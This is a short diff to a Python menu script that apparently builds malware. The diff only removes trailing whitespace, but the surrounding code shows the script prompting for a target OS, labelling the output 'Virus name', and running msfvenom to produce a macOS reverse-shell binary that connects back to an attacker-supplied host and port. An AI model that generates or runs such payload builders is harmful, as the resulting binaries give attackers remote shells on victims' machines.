@@ -18,7 +18,7 @@ def menu():
     print('Chose a target OS: \n\nType(1) for Windows 10.\nType(2) for Linux.\nType(3) for Mac OS.')
     print()
     choice = input()
-    
+
 
     if choice == '1':
         print()
@@ -58,7 +58,7 @@ def menu():
         print(Fore.GREEN)
         print('Virus name: MAC_app.macho')
         attack3 = os.system(f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o {location}MAC_app.macho")
-        
+
 menu()
 
 print()
